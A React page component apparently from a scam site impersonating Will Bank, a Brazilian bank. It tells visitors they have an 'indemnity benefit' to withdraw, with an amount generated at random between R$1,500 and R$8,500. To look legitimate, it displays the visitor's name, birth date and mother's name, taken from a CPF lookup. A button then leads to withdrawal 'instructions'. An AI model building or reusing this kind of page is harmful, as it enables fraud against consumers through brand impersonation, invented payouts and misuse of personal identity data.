import { useEffect, useState } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { CheckCircle, Gift, ArrowRight, User, Calendar, Users } from "lucide-react";
import willbankLogo from "@/assets/willbank-logo.png";
import { CPFData } from "@/lib/cpf";

const Resultado = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [showValue, setShowValue] = useState(false);

  const cpfData: CPFData | undefined = location.state?.cpfData;

  // Gera valor aleatório entre R$ 1.500 e R$ 8.500
  const [valorBeneficio] = useState(() => {
    return Math.floor(Math.random() * (8500 - 1500 + 1) + 1500);
  });

  useEffect(() => {
    if (!cpfData) {
      navigate("/");
      return;
    }

    // Animação para mostrar o valor
    const timer = setTimeout(() => {
      setShowValue(true);
    }, 800);

    return () => clearTimeout(timer);
  }, [cpfData, navigate]);

  const handleContinuar = () => {
    navigate("/video", { state: { cpfData, valorBeneficio } });
  };

  if (!cpfData) return null;

  return (
    <div className="min-h-screen bg-background flex flex-col">
      {/* Header */}
      <header className="bg-card border-b border-border px-6 py-4">
        <div className="max-w-4xl mx-auto">
          <div className="flex items-center justify-between mb-4">
            <img src={willbankLogo} alt="Will Bank" className="h-10 object-contain" />
          </div>
          <div className="flex items-center gap-2 text-sm text-muted-foreground">
            <span>Benefício</span>
            <span>›</span>
            <span>Indenização</span>
            <span>›</span>
            <span className="text-foreground font-medium">Resultado</span>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-1 flex items-center justify-center p-4 sm:p-6">
        <Card className="w-full max-w-md shadow-xl border-0 overflow-hidden">
          <div className="bg-primary h-2" />
          
          <CardContent className="p-6 sm:p-8 space-y-6">
            {/* Success Icon */}
            <div className="text-center">
              <div className="inline-flex items-center justify-center w-16 h-16 bg-green-100 rounded-full mb-4">
                <CheckCircle className="w-10 h-10 text-green-600" />
              </div>
              <h1 className="text-2xl font-bold text-foreground">
                Parabéns, {cpfData.nome.split(' ')[0]}!
              </h1>
              <p className="text-muted-foreground mt-2">
                Você possui um benefício disponível para saque
              </p>
            </div>

            {/* Value Card */}
            <div className="bg-primary/10 rounded-xl p-6 text-center border-2 border-primary/20">
              <div className="flex items-center justify-center gap-2 mb-2">
                <Gift className="w-5 h-5 text-primary" />
                <span className="text-sm font-medium text-muted-foreground">
                  Valor disponível para saque
                </span>
              </div>
              <div 
                className={`text-4xl font-bold text-primary transition-all duration-500 ${
                  showValue ? "opacity-100 scale-100" : "opacity-0 scale-50"
                }`}
              >
                R$ {valorBeneficio.toLocaleString('pt-BR')},00
              </div>
            </div>

            {/* User Data Summary */}
            <div className="space-y-3">
              <div className="flex items-center gap-3 p-3 bg-muted/50 rounded-lg">
                <User className="w-5 h-5 text-primary" />
                <div className="flex-1">
                  <span className="text-xs text-muted-foreground block">Nome</span>
                  <span className="font-medium text-foreground text-sm">{cpfData.nome}</span>
                </div>
              </div>

              <div className="flex items-center gap-3 p-3 bg-muted/50 rounded-lg">
                <Calendar className="w-5 h-5 text-primary" />
                <div className="flex-1">
                  <span className="text-xs text-muted-foreground block">Nascimento</span>
                  <span className="font-medium text-foreground text-sm">{cpfData.dataNascimento}</span>
                </div>
              </div>

              <div className="flex items-center gap-3 p-3 bg-muted/50 rounded-lg">
                <Users className="w-5 h-5 text-primary" />
                <div className="flex-1">
                  <span className="text-xs text-muted-foreground block">Mãe</span>
                  <span className="font-medium text-foreground text-sm">{cpfData.nomeMae}</span>
                </div>
              </div>
            </div>

            {/* CTA Button */}
            <Button 
              onClick={handleContinuar}
              className="w-full h-12 text-base font-semibold"
            >
              Ver como sacar
              <ArrowRight className="w-5 h-5" />
            </Button>

            <p className="text-xs text-center text-muted-foreground">
              Clique acima para ver as instruções de como realizar o saque do seu benefício
            </p>
          </CardContent>
        </Card>
      </main>

      {/* Footer */}
      <footer className="bg-primary text-primary-foreground px-6 py-4">
        <div className="max-w-4xl mx-auto text-center">
          <p className="text-sm opacity-80">
            © 2025 Will Bank. Todos os direitos reservados.
          </p>
        </div>
      </footer>
    </div>
  );
};

export default Resultado;
